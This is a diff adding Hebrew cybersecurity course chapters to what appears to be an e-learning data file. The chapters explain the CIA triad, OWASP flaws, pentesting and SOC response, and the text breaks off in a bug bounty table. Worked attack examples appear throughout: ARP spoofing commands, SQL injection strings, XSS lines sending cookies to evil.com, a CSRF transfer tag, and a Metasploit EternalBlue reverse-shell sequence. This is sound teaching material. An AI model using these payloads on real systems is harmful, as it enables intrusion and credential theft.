@@ -4315,7 +4315,513 @@ spec:
     icon: '🔐',
     color: '#ef4444',
     level: 'בינוני–מתקדם',
-    chapters: [] // loaded separately
+    chapters: [
+  {
+    id: 101,
+    title: "CIA Triad — יסודות אבטחת מידע",
+    pages: [
+      {
+        type: "explanation",
+        title: "שלושת עמודי תווך",
+        content: `<div dir="rtl">
+<h2>CIA Triad — המודל שמנחה כל מחשבה בסייבר</h2>
+<p>לפני שמדברים על כלים ותקיפות, חייבים להבין <em>מה</em> אנחנו מגינים. כל בעיית אבטחה ניתנת לסיווג לאחת משלוש קטגוריות:</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 150" class="content-diagram">
+  <polygon points="180,15 30,135 330,135" fill="none" stroke="#64748b" stroke-width="2"/>
+  <circle cx="180" cy="28" r="22" fill="#7f1d1d" stroke="#ef4444" stroke-width="2"/>
+  <text x="180" y="24" text-anchor="middle" font-size="9" fill="#fca5a5" font-weight="bold">Confidentiality</text>
+  <text x="180" y="36" text-anchor="middle" font-size="8" fill="#fca5a5">סודיות</text>
+  <circle cx="65" cy="128" r="22" fill="#14532d" stroke="#22c55e" stroke-width="2"/>
+  <text x="65" y="124" text-anchor="middle" font-size="9" fill="#86efac" font-weight="bold">Integrity</text>
+  <text x="65" y="136" text-anchor="middle" font-size="8" fill="#86efac">שלמות</text>
+  <circle cx="295" cy="128" r="22" fill="#1e3a5f" stroke="#3b82f6" stroke-width="2"/>
+  <text x="295" y="124" text-anchor="middle" font-size="9" fill="#93c5fd" font-weight="bold">Availability</text>
+  <text x="295" y="136" text-anchor="middle" font-size="8" fill="#93c5fd">זמינות</text>
+  <text x="180" y="90" text-anchor="middle" font-size="10" fill="#94a3b8">CIA</text>
+</svg>
+</div>
+<table class="content-table">
+  <tr><th>עיקרון</th><th>הגדרה</th><th>איום נגדו</th><th>הגנה</th></tr>
+  <tr><td><strong>Confidentiality</strong></td><td>רק מורשים יכולים לגשת למידע</td><td>Sniffing, Data Breach</td><td>הצפנה, ACL, MFA</td></tr>
+  <tr><td><strong>Integrity</strong></td><td>המידע לא שונה ללא הרשאה</td><td>Tampering, Injection</td><td>Hash, Digital Signature, Audit Log</td></tr>
+  <tr><td><strong>Availability</strong></td><td>המערכת זמינה כשצריך</td><td>DoS/DDoS, Ransomware</td><td>Redundancy, Rate Limiting, Backup</td></tr>
+</table>
+<p>כשאתה שומע על breach — שאל: <em>איזה עיקרון הופר?</em> ב-Equifax 2017: Confidentiality (147M רשומות). ב-NotPetya: Availability (חברות שלמות ירדו). ב-SolarWinds: Integrity (עדכון תוכנה שונה).</p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "STRIDE ו-Threat Modeling",
+        content: `<div dir="rtl">
+<h2>STRIDE — מיפוי איומים בשיטה</h2>
+<p>Threat Modeling שואל: <em>מה יכול להשתבש?</em> Microsoft פיתחה את STRIDE בשנות ה-90 — ועדיין הכלי הטוב ביותר לניתוח סיסטמטי:</p>
+<table class="content-table">
+  <tr><th>אות</th><th>איום</th><th>דוגמה</th><th>הגנה</th></tr>
+  <tr><td><strong>S</strong></td><td>Spoofing — התחזות</td><td>Email spoofing, ARP poisoning</td><td>אימות, SPF/DKIM, certificates</td></tr>
+  <tr><td><strong>T</strong></td><td>Tampering — שינוי נתונים</td><td>SQL injection, MITM</td><td>Hashing, digital signatures, TLS</td></tr>
+  <tr><td><strong>R</strong></td><td>Repudiation — הכחשה</td><td>"לא אני שלחתי את הפקודה"</td><td>Audit logs, digital signatures</td></tr>
+  <tr><td><strong>I</strong></td><td>Info Disclosure — דליפת מידע</td><td>חשיפת error messages עם DB info</td><td>הצפנה, input validation</td></tr>
+  <tr><td><strong>D</strong></td><td>Denial of Service</td><td>SYN flood, Slowloris</td><td>Rate limiting, CDN, WAF</td></tr>
+  <tr><td><strong>E</strong></td><td>Elevation of Privilege</td><td>Buffer overflow → root access</td><td>Least privilege, sandboxing</td></tr>
+</table>
+<h3>Attack Surface Analysis</h3>
+<p>Attack Surface = כל נקודות הכניסה האפשריות למערכת. כלל אצבע: <em>צמצם את ה-attack surface</em>.</p>
+<ul>
+<li>כל endpoint API שחשוף = attack surface</li>
+<li>כל dependency (npm, pip) = attack surface</li>
+<li>כל employee עם access = attack surface</li>
+<li>כל port פתוח = attack surface</li>
+</ul>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: Target 2013 — 40M כרטיסי אשראי",
+        content: `<div dir="rtl">
+<h2>כשה-HVAC contractor הרס את Target</h2>
+<p>נובמבר 2013, ארה"ב: Target, רשת קמעונאות ענקית, הותקפה. 40 מיליון כרטיסי אשראי נגנבו בשישה שבועות. עלות: $162M ישירים, $1B+ בנזקים עקיפים. CEO ו-CISO התפטרו.</p>
+<p><strong>שלבי המתקפה (kill chain):</strong></p>
+<ol>
+<li><strong>Reconnaissance:</strong> התוקפים זיהו ש-Target עובדת עם vendor HVAC (Fazio Mechanical) שיש לו remote access לרשת לניטור מערכות חימום.</li>
+<li><strong>Initial Access:</strong> Phishing email ל-Fazio → גנבו credentials → נכנסו לפורטל הvendor של Target.</li>
+<li><strong>Lateral Movement:</strong> הרשת הפנימית של Target לא הייתה מפולחת. מה-vendor portal הגיעו ל-POS systems (מכשירי קופה).</li>
+<li><strong>Payload:</strong> התקינו RAM scraper malware על עשרות אלפי מכשירי POS — הוא לכד את נתוני הכרטיס ברגע שהמגנט נקרא, לפני ההצפנה.</li>
+<li><strong>Exfiltration:</strong> הנתונים יצאו דרך FTP servers שהוקמו בתוך הרשת של Target לשרתים ברוסיה.</li>
+</ol>
+<p><strong>מה שהיה צריך לעשות:</strong> Network segmentation — vendor access לרשת נפרדת שלא יכולה לגעת ב-POS. זה הכישלון הבסיסי ביותר בDefense in Depth.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 102,
+    title: "מתקפות רשת — TCP/IP כנשק",
+    pages: [
+      {
+        type: "explanation",
+        title: "ARP Spoofing ו-MITM",
+        content: `<div dir="rtl">
+<h2>ARP: הפרוטוקול שנוצר בלי לחשוב על אבטחה</h2>
+<p>ARP (Address Resolution Protocol) ממפה IP לMAC. הבעיה: ARP stateless ו-trustless — כל מי ברשת יכול לשדר "אני 192.168.1.1, ה-MAC שלי הוא XX:XX".</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 140" class="content-diagram">
+  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">ARP Spoofing — Man in the Middle</text>
+  <rect x="10" y="25" width="70" height="25" rx="4" fill="#1e3a5f"/>
+  <text x="45" y="41" text-anchor="middle" font-size="10" fill="#7dd3fc">Victim PC</text>
+  <rect x="145" y="25" width="70" height="25" rx="4" fill="#7f1d1d"/>
+  <text x="180" y="41" text-anchor="middle" font-size="10" fill="#fca5a5">Attacker</text>
+  <rect x="280" y="25" width="70" height="25" rx="4" fill="#14532d"/>
+  <text x="315" y="41" text-anchor="middle" font-size="10" fill="#86efac">Gateway</text>
+  <line x1="80" y1="37" x2="145" y2="37" stroke="#ef4444" stroke-width="2"/>
+  <text x="112" y="30" text-anchor="middle" font-size="8" fill="#ef4444">① Traffic →</text>
+  <line x1="215" y1="37" x2="280" y2="37" stroke="#ef4444" stroke-width="2"/>
+  <text x="247" y="30" text-anchor="middle" font-size="8" fill="#ef4444">② Forward →</text>
+  <text x="45" y="75" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
+  <text x="45" y="87" text-anchor="middle" font-size="8" fill="#fca5a5">GW = ATTACKER MAC!</text>
+  <text x="315" y="75" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
+  <text x="315" y="87" text-anchor="middle" font-size="8" fill="#fca5a5">Victim = ATTACKER MAC!</text>
+  <text x="180" y="110" text-anchor="middle" font-size="9" fill="#f87171">Attacker שולח ARP replies מזויפים לשני הצדדים</text>
+  <text x="180" y="125" text-anchor="middle" font-size="8" fill="#94a3b8">→ כל הטראפיק עובר דרכו (read, modify, inject)</text>
+</svg>
+</div>
+<div class="code-preview"><pre><code># arpspoof (Linux) — MITM בסיסי
+sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
+# -t = target victim, כתובת ה-gateway
+
+# הפעלת IP forwarding (כדי לא לנתק את הקורבן)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# כלי מקיף יותר: bettercap
+sudo bettercap -iface eth0
+# net.probe on; arp.spoof.targets 192.168.1.5; arp.spoof on</code></pre></div>
+<p><strong>הגנה:</strong> Dynamic ARP Inspection (DAI) ב-managed switches, Static ARP entries לGateway, TLS (MITM לא עוזר אם הcert אינו חתום על ידי CA אמין).</p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "SYN Flood ו-TCP Exhaustion",
+        content: `<div dir="rtl">
+<h2>SYN Flood — ניצול TCP Handshake</h2>
+<p>בTCP three-way handshake, שרת מקצה state (half-open connection) לכל SYN שמגיע. SYN Flood שולח מיליוני SYNs עם IP מזויף — השרת שומר מיליוני half-open entries ב-memory עד שהתור מלא.</p>
+<div class="code-preview"><pre><code># TCP stack: כשמגיע SYN
+1. הקצה memory לחיבור (Transmission Control Block)
+2. שלח SYN-ACK
+3. חכה לACK (מצב SYN_RCVD) — timeout כ-60 שניות!
+
+# עם SYN Flood:
+# - מיליוני SYNs ← מיליוני TCBs ב-memory
+# - ה-backlog queue מלא
+# - חיבורים לגיטימיים נדחים (SYN-ACK לא נשלח)</code></pre></div>
+<h3>SYN Cookies — הפתרון</h3>
+<p>במקום לשמור state, השרת מקודד את המידע ב-ISN (Initial Sequence Number) של ה-SYN-ACK. רק כשמגיע ACK אמיתי — שחזור ה-state. מי ששלח IP מזויף לא יכול לשלוח ACK.</p>
+<div class="code-preview"><pre><code># בדיקה ב-Linux
+sysctl net.ipv4.tcp_syncookies
+# 1 = מופעל (ברירת מחדל בלינוקס מודרני)
+
+# הגנה נוספת — הקטנת backlog timeout
+sysctl net.ipv4.tcp_synack_retries
+# ברירת מחדל 5 (320s!) — הורד ל-2</code></pre></div>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: DDoS של 3.47 Tbps",
+        content: `<div dir="rtl">
+<h2>הDDoS הגדול בהיסטוריה — ועדיין נשארנו online</h2>
+<p>ינואר 2022: Microsoft דיווחה על DDoS attack של <strong>3.47 Tbps</strong> על לקוח שלהם (Azure). זה שיא עולמי. 10,000 sources ב-10 מדינות. משך: 15 דקות.</p>
+<p><strong>הוקטורים שנוצלו:</strong></p>
+<ul>
+<li>UDP Reflection via CLDAP, DNS, NTP — שולחים UDP packet קטן לservers ציבוריים עם spoofed IP של הקורבן → הservers מחזירים תגובה גדולה x100 לקורבן</li>
+<li>Amplification factor של DNS: קבצי request 40 bytes → response 3,000 bytes (75x amplification)</li>
+</ul>
+<p><strong>מה Azure עשה:</strong> Azure DDoS Protection tier מזהה ומנקה traffic ברמה של network edge — לפני שהpackets מגיעים ל-server. Anycast scrubbing centers בכל העולם.</p>
+<p><strong>הלקח:</strong> DDoS מוגן ב-scale בלבד. אי אפשר "לבנות שרת גדול מספיק". הפתרון הוא distributed scrubbing infrastructure — Cloudflare, Azure DDoS Protection, AWS Shield Advanced. בלי זה, כל חברה פגיעה.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 103,
+    title: "OWASP Top 10 — פגיעויות Web",
+    pages: [
+      {
+        type: "explanation",
+        title: "SQL Injection — הקלאסיקה",
+        content: `<div dir="rtl">
+<h2>SQL Injection — פגיעות #1 במשך 20 שנה</h2>
+<p>SQL Injection מתרחשת כשקלט של משתמש מוזרק ישירות ל-SQL query ללא סניטציה. התוצאה: התוקף כותב SQL עצמו.</p>
+<div class="code-preview"><pre><code>// קוד פגיע — NEVER DO THIS
+const query = "SELECT * FROM users WHERE email='" + email + "' AND password='" + password + "'";
+
+// Input של תוקף:
+// email: admin@site.com'--
+// password: anything
+
+// SQL שנוצר:
+// SELECT * FROM users WHERE email='admin@site.com'--' AND password='anything'
+// ה-- הופך כל השאר לcomment — מחזיר admin ללא password!
+
+// ====== Parameterized Queries — הפתרון ======
+const query = "SELECT * FROM users WHERE email=? AND password=?";
+db.execute(query, [email, hashedPassword]); // SAFE</code></pre></div>
+<h3>SQLi Variants</h3>
+<table class="content-table">
+  <tr><th>סוג</th><th>עובד איך</th><th>דוגמה</th></tr>
+  <tr><td>Classic</td><td>תגובת שגיאה מחזירה נתונים</td><td>' OR '1'='1</td></tr>
+  <tr><td>Blind Boolean</td><td>שינוי תוכן דף (true/false)</td><td>' AND 1=1-- (vs AND 1=2--)</td></tr>
+  <tr><td>Time-based Blind</td><td>עיכוב תגובה = true</td><td>'; IF(1=1) WAITFOR DELAY '5s'--</td></tr>
+  <tr><td>Union-based</td><td>חיבור query נוסף</td><td>' UNION SELECT username,password FROM users--</td></tr>
+</table>
+<p><strong>כלי:</strong> sqlmap מבצע SQLi אוטומטית: <code>sqlmap -u "https://target.com/search?q=1" --dbs</code></p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "XSS ו-CSRF",
+        content: `<div dir="rtl">
+<h2>XSS — הזרקת JavaScript לדפדפן של הקורבן</h2>
+<p>Cross-Site Scripting מתרחש כשאפליקציה מחזירה input של משתמש ב-HTML ללא escaping:</p>
+<div class="code-preview"><pre><code>// Reflected XSS — ב-URL:
+https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+
+// Stored XSS — שמור בDB (הכי מסוכן):
+// תוקף מגיב לפוסט עם:
+<img src=x onerror="fetch('https://evil.com/?c='+btoa(document.cookie))">
+// כל מי שרואה את התגובה — נגנב ה-cookie שלו
+
+// הגנה:
+// 1. HTML escape: & → &amp; < → &lt; > → &gt;
+// 2. Content Security Policy (CSP) header
+// 3. HttpOnly cookies (JavaScript לא יכול לקרוא)</code></pre></div>
+<h3>CSRF — Cross-Site Request Forgery</h3>
+<p>CSRF מנצל שהדפדפן שולח cookies אוטומטית לכל request לאותו domain:</p>
+<div class="code-preview"><pre><code><!-- באתר זדוני — תוקף שולח לכם לinк -->
+<img src="https://bank.com/transfer?to=attacker&amount=10000" width="0">
+<!-- אם אתם מחוברים לbank.com — הבקשה תועבר עם ה-cookie שלכם! -->
+
+<!-- הגנה: CSRF Token — ערך ייחודי שה-server שולח בform -->
+<input type="hidden" name="csrf_token" value="x8f3...">
+<!-- Server מאמת שהtoken תואם — אתר זדוני לא יכול לדעת את הtoken --></code></pre></div>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "OWASP Top 10 — הרשימה המלאה",
+        content: `<div dir="rtl">
+<h2>OWASP Top 10 — 2021</h2>
+<p>OWASP (Open Worldwide Application Security Project) מפרסמת רשימה של 10 הסיכונים הנפוצים ביותר:</p>
+<table class="content-table">
+  <tr><th>#</th><th>קטגוריה</th><th>דוגמה</th></tr>
+  <tr><td>A01</td><td>Broken Access Control</td><td>IDOR — גישה לdata של user אחר ע"י שינוי ID</td></tr>
+  <tr><td>A02</td><td>Cryptographic Failures</td><td>אחסון passwords בplaintext, HTTP במקום HTTPS</td></tr>
+  <tr><td>A03</td><td>Injection</td><td>SQL, NoSQL, OS Command, LDAP injection</td></tr>
+  <tr><td>A04</td><td>Insecure Design</td><td>חוסר threat modeling בשלב העיצוב</td></tr>
+  <tr><td>A05</td><td>Security Misconfiguration</td><td>Default passwords, open S3 buckets, verbose errors</td></tr>
+  <tr><td>A06</td><td>Vulnerable Components</td><td>Log4Shell, npm packages עם CVEs</td></tr>
+  <tr><td>A07</td><td>Auth & Session Failures</td><td>Weak passwords, session fixation, JWT none alg</td></tr>
+  <tr><td>A08</td><td>Software Integrity Failures</td><td>SolarWinds — update pipeline compromise</td></tr>
+  <tr><td>A09</td><td>Logging & Monitoring Failures</td><td>ללא logs ← לא יודעים שנפרצנו</td></tr>
+  <tr><td>A10</td><td>SSRF</td><td>Server fetches URLs מInput — חשיפת AWS metadata</td></tr>
+</table>
+<p><strong>IDOR דוגמה (A01):</strong> <code>GET /api/orders/1234</code> — מה אם תנסה <code>/api/orders/1235</code>? אם אין access control — קיבלת הזמנה של אחר.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 104,
+    title: "Penetration Testing — מתודולוגיה",
+    pages: [
+      {
+        type: "explanation",
+        title: "Pentest Lifecycle",
+        content: `<div dir="rtl">
+<h2>מה זה Penetration Testing ולמה זה שונה מhacking</h2>
+<p>Pentesting הוא תקיפה <em>מורשית</em> — scope מוגדר, חוזה משפטי, מטרה: מצא חולשות לפני התוקפים האמיתיים.</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 80" class="content-diagram">
+  <rect x="5" y="20" width="60" height="40" rx="5" fill="#1e3a5f"/>
+  <text x="35" y="37" text-anchor="middle" font-size="8" fill="#7dd3fc">1. Recon</text>
+  <text x="35" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">מידע פסיבי</text>
+  <line x1="65" y1="40" x2="75" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
+  <rect x="75" y="20" width="60" height="40" rx="5" fill="#14532d"/>
+  <text x="105" y="37" text-anchor="middle" font-size="8" fill="#86efac">2. Scanning</text>
+  <text x="105" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Nmap, Nessus</text>
+  <line x1="135" y1="40" x2="145" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
+  <rect x="145" y="20" width="60" height="40" rx="5" fill="#4c1d95"/>
+  <text x="175" y="37" text-anchor="middle" font-size="8" fill="#c4b5fd">3. Exploit</text>
+  <text x="175" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Metasploit</text>
+  <line x1="205" y1="40" x2="215" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
+  <rect x="215" y="20" width="60" height="40" rx="5" fill="#78350f"/>
+  <text x="245" y="37" text-anchor="middle" font-size="8" fill="#fcd34d">4. Post-Exp</text>
+  <text x="245" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Pivot, Persist</text>
+  <line x1="275" y1="40" x2="285" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
+  <rect x="285" y="20" width="70" height="40" rx="5" fill="#1e293b" stroke="#0891b2"/>
+  <text x="320" y="37" text-anchor="middle" font-size="8" fill="#7dd3fc">5. Report</text>
+  <text x="320" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">עדיפויות + fix</text>
+  <defs><marker id="a" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#64748b"/></marker></defs>
+</svg>
+</div>
+<table class="content-table">
+  <tr><th>שלב</th><th>מה עושים</th><th>כלים</th></tr>
+  <tr><td>Recon פסיבי</td><td>WHOIS, Google dorking, LinkedIn, Shodan</td><td>theHarvester, maltego</td></tr>
+  <tr><td>Recon אקטיבי</td><td>DNS enumeration, port scan, OS fingerprint</td><td>Nmap, Masscan</td></tr>
+  <tr><td>Vulnerability Scan</td><td>CVE detection, misconfiguration</td><td>Nessus, OpenVAS, Nuclei</td></tr>
+  <tr><td>Exploitation</td><td>ניצול CVEs, web vulnerabilities</td><td>Metasploit, Burp Suite, SQLmap</td></tr>
+  <tr><td>Post-Exploitation</td><td>Privilege escalation, lateral movement, data access</td><td>Mimikatz, BloodHound, Cobalt Strike</td></tr>
+  <tr><td>Reporting</td><td>Executive summary + Technical findings + CVSS scores</td><td>—</td></tr>
+</table>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "כלי Pentest עיקריים",
+        content: `<div dir="rtl">
+<h2>ארגז הכלים של ה-Pentester</h2>
+<h3>Nmap — לב הסריקה</h3>
+<div class="code-preview"><pre><code># סריקה בסיסית
+nmap -sV -O 192.168.1.1
+
+# סריקה מלאה אגרסיבית
+nmap -A -T4 192.168.1.0/24
+
+# NSE scripts — בדיקות ספציפיות
+nmap --script vuln 192.168.1.1
+nmap --script http-enum 192.168.1.1
+
+# סריקת UDP (איטית אבל חשובה)
+nmap -sU -p 53,161,500 192.168.1.1</code></pre></div>
+<h3>Burp Suite — Web Application Testing</h3>
+<div class="code-preview"><pre><code># Burp Suite Community/Pro:
+# Proxy — יירוט ושינוי HTTP requests
+# Repeater — שליחת requests ידנית שוב ושוב
+# Intruder — brute force, fuzzing
+# Scanner (Pro) — automatic vulnerability scan
+# Decoder — base64, URL encode/decode</code></pre></div>
+<h3>Metasploit — Framework לExploitation</h3>
+<div class="code-preview"><pre><code">msfconsole
+search ms17-010          # EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.5
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+run</code></pre></div>
+<p><strong>Kali Linux</strong> מגיעה עם כל הכלים הללו מותקנים מראש — ה-distro הסטנדרטי לpentesting.</p>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: Red Team מול בנק",
+        content: `<div dir="rtl">
+<h2>יום בחיי Red Teamer — כשנכנסים בלי שיודעים</h2>
+<p>חברת pentesting גדולה קיבלה הרשאה לבצע Red Team engagement מלא — כולל Physical intrusion וSocial Engineering. הקורבן: בנק בינלאומי. Duration: 2 שבועות.</p>
+<p><strong>שלב 1 — Recon פסיבי (3 ימים):</strong> LinkedIn חשף 15 עובדים בIT. GitHub של אחד מהם — credentials ישנים שלא הוסרו לprod DB. Shodan חשף VPN endpoint עתיקה עם Citrix CVE.</p>
+<p><strong>שלב 2 — Initial Access:</strong> Phishing email מותאם אישית לIT manager — "עדכון דחוף ל-VPN client". Payload = Cobalt Strike beacon. קיבלו foothold ב-workstation פנימי.</p>
+<p><strong>שלב 3 — Lateral Movement:</strong> BloodHound מיפה את Active Directory. מצאו Service Account עם too much privileges. Pass-the-Hash לDomain Controller. Game over.</p>
+<p><strong>הממצאים בדוח:</strong> Criticals: 3 (Citrix CVE, weak AD, credentials in GitHub). Highs: 7. בסך הכל 47 findings.</p>
+<p><strong>הלקח:</strong> הבנק האמין שהוא מוגן. CISO אמר: "שלמנו $500K על firewalls". הכניסה הייתה דרך email זדוני ו-LinkedIn. Technology לא מגן על human error.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 105,
+    title: "Blue Team ו-SOC",
+    pages: [
+      {
+        type: "explanation",
+        title: "Defense in Depth",
+        content: `<div dir="rtl">
+<h2>Defense in Depth — שכבות הגנה</h2>
+<p>אסטרטגיית Defense in Depth: אין שכבה אחת שמספיקה. כל שכבה מניחה שהשכבה שלפניה כשלה.</p>
+<div class="diagram-container">
+<svg viewBox="0 0 360 150" class="content-diagram">
+  <ellipse cx="180" cy="105" rx="170" ry="40" fill="#0f172a" stroke="#64748b"/>
+  <text x="180" y="109" text-anchor="middle" font-size="9" fill="#94a3b8">Physical Security</text>
+  <ellipse cx="180" cy="98" rx="145" ry="33" fill="#0f172a" stroke="#475569"/>
+  <text x="180" y="102" text-anchor="middle" font-size="9" fill="#64748b">Network Perimeter (Firewall)</text>
+  <ellipse cx="180" cy="90" rx="120" ry="27" fill="#0f172a" stroke="#334155"/>
+  <text x="180" y="94" text-anchor="middle" font-size="9" fill="#94a3b8">Network Segmentation (VLAN)</text>
+  <ellipse cx="180" cy="82" rx="95" ry="21" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
+  <text x="180" y="86" text-anchor="middle" font-size="9" fill="#93c5fd">Endpoint Protection (EDR)</text>
+  <ellipse cx="180" cy="72" rx="70" ry="16" fill="#1e3a5f" stroke="#60a5fa" stroke-width="1.5"/>
+  <text x="180" y="76" text-anchor="middle" font-size="9" fill="#7dd3fc">Application Security (WAF)</text>
+  <ellipse cx="180" cy="60" rx="48" ry="12" fill="#1e3a5f" stroke="#818cf8" stroke-width="1.5"/>
+  <text x="180" y="64" text-anchor="middle" font-size="8" fill="#a5b4fc">Data Encryption</text>
+  <ellipse cx="180" cy="47" rx="28" ry="9" fill="#4c1d95" stroke="#a78bfa" stroke-width="1.5"/>
+  <text x="180" y="51" text-anchor="middle" font-size="7" fill="#ddd6fe">IAM + MFA</text>
+  <text x="180" y="22" text-anchor="middle" font-size="10" fill="#e2e8f0" font-weight="bold">Defense in Depth</text>
+</svg>
+</div>
+<p>כל שכבה מגנה מפני vector שונה. גם אם תוקף עקף Firewall, EDR יכול לזהות את הmalware. גם אם הmalware רץ, Encryption מגן על הdata.</p>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "SIEM ו-Incident Response",
+        content: `<div dir="rtl">
+<h2>SIEM — עיני ה-SOC</h2>
+<p>SIEM (Security Information and Event Management) מאגד logs מכל המערכות ומנתח בזמן אמת:</p>
+<table class="content-table">
+  <tr><th>כלי SIEM</th><th>מאפיין</th></tr>
+  <tr><td>Splunk</td><td>מסחרי, החזק ביותר, SPL query language</td></tr>
+  <tr><td>Elastic SIEM (ELK)</td><td>Open source, Kibana dashboards, KQL</td></tr>
+  <tr><td>Microsoft Sentinel</td><td>Cloud-native Azure, KQL, AI correlation</td></tr>
+  <tr><td>IBM QRadar</td><td>Enterprise, AQL, behavioral analytics</td></tr>
+</table>
+<h3>Incident Response Lifecycle (NIST)</h3>
+<ol>
+<li><strong>Preparation:</strong> IR plan, playbooks, team roles, tools ready</li>
+<li><strong>Detection & Analysis:</strong> Alert fires → triage → scope assessment</li>
+<li><strong>Containment:</strong> Isolate affected systems, preserve evidence</li>
+<li><strong>Eradication:</strong> Remove malware, patch vulnerability, rotate credentials</li>
+<li><strong>Recovery:</strong> Restore from clean backup, monitor closely</li>
+<li><strong>Lessons Learned:</strong> Post-mortem, update playbooks, train team</li>
+</ol>
+<div class="code-preview"><pre><code"># Splunk — hunting lateral movement
+index=windows EventCode=4624
+  LogonType=3 NOT (src_ip="127.0.0.1")
+| stats count by src_ip, dest_ip, user
+| where count > 10
+| sort -count</code></pre></div>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: SOC Analyst מוצא APT",
+        content: `<div dir="rtl">
+<h2>3 בלילה — Alert שמשנה הכל</h2>
+<p>SOC analyst בחברת ביטוח גדולה מקבלת alert ב-3:17AM: "unusual volume of LDAP queries from workstation WS-0342". Rule: workstation שלחה 2,000+ LDAP queries תוך דקה — נורמלי הוא 0-5.</p>
+<p><strong>Triage (10 דקות ראשונות):</strong></p>
+<ul>
+<li>בדקה ב-Splunk: WS-0342 שייכת לאנליסט פיננסי שנמצא בחופשה</li>
+<li>Login events: מחשב הכניסה logon ב-02:50AM — חריג מאוד</li>
+<li>Source IP של הlogin: 94.x.x.x — IP רוסי (בדיקה ב-VirusTotal: C2 server ידוע)</li>
+</ul>
+<p><strong>Containment (20 דקות):</strong> מיד ניתקה WS-0342 מהרשת. נחסמה הכניסה לחשבון. Forensic image של הדיסק לפני כל שינוי.</p>
+<p><strong>Investigation:</strong> Malware התקין backdoor 3 שבועות קודם (phishing email שלא זוהה בזמן). 3 שבועות של LDAP enumeration ו-BloodHound mapping — התוקף מיפה את כל ה-AD. לא הספיק לPivot לDomain Controller.</p>
+<p><strong>הלקח:</strong> ה-SIEM rule הפשוטה של LDAP queries — עצרה מתקפה שהייתה יכולה להיות catastrophic. הgame changer היה ה-detection, לא ה-prevention.</p>
+</div>`
+      }
+    ]
+  },
+  {
+    id: 106,
+    title: "CTF ו-Bug Bounty",
+    pages: [
+      {
+        type: "explanation",
+        title: "CTF — Capture The Flag",
+        content: `<div dir="rtl">
+<h2>CTF — הדרך הכיפית ללמוד סייבר</h2>
+<p>CTF הוא תחרות בה פותרים אתגרי אבטחה כדי למצוא "flag" — מחרוזת מיוחדת שמוכיחה שפתרת.</p>
+<table class="content-table">
+  <tr><th>קטגוריה</th><th>מה זה</th><th>כלים</th></tr>
+  <tr><td>Web</td><td>SQL injection, XSS, SSRF, deserialization</td><td>Burp Suite, sqlmap</td></tr>
+  <tr><td>Pwn (Binary)</td><td>Buffer overflow, ROP chains, heap exploitation</td><td>pwndbg, pwntools, gdb</td></tr>
+  <tr><td>Crypto</td><td>RSA attacks, AES modes, hash collisions</td><td>Python, SageMath</td></tr>
+  <tr><td>Forensics</td><td>ניתוח memory dumps, steganography, PCAP</td><td>Autopsy, Volatility, Wireshark</td></tr>
+  <tr><td>Reverse Engineering</td><td>disassembly, decompilation, anti-debug</td><td>Ghidra, IDA, x64dbg</td></tr>
+  <tr><td>OSINT</td><td>גילוי מידע ממקורות ציבוריים</td><td>Maltego, theHarvester</td></tr>
+</table>
+<h3>פלטפורמות לתרגול</h3>
+<ul>
+<li><strong>HackTheBox</strong> — מכונות לpwn ו-CTF challenges. הכי פופולרי.</li>
+<li><strong>TryHackMe</strong> — guided learning paths, מתחילים ידידותי</li>
+<li><strong>PicoCTF</strong> — קל יותר, מצוין למתחילים</li>
+<li><strong>CTFtime.org</strong> — לוח תחרויות עולמי</li>
+<li><strong>PortSwigger Web Academy</strong> — web labs חינמיים</li>
+</ul>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "Bug Bounty — לקבל תשלום על מציאת חולשות",
+        content: `<div dir="rtl">
+<h2>Bug Bounty — תעשייה של $1.5B בשנה</h2>
+<p>חברות משלמות לחוקרים שמוצאים ומדווחים על חולשות בצורה אחראית (Responsible Disclosure). HackerOne דיווחה ב-2023: researcher אחד הרוויח $4M לאורך הקריירה.</p>
+<table class="content-table">
+  <tr><th>פלטפורמה</th><th>מי שם</th><th>טווח תשלומים</th></tr>
+  <tr><td>HackerOne</td><td>Google, Apple, Microsoft, US DoD</td><td>$100 — $100,000+</td></tr>
+  <tr><td>Bugcrowd</td><td>Tesla, Mastercard, Atlassian</td><td>$50 — $50,000</td></tr>
+  <tr><td>Intigriti</td><td>חברות אירופיות, NATO</td><td>€100 — €20,000</td></tr>
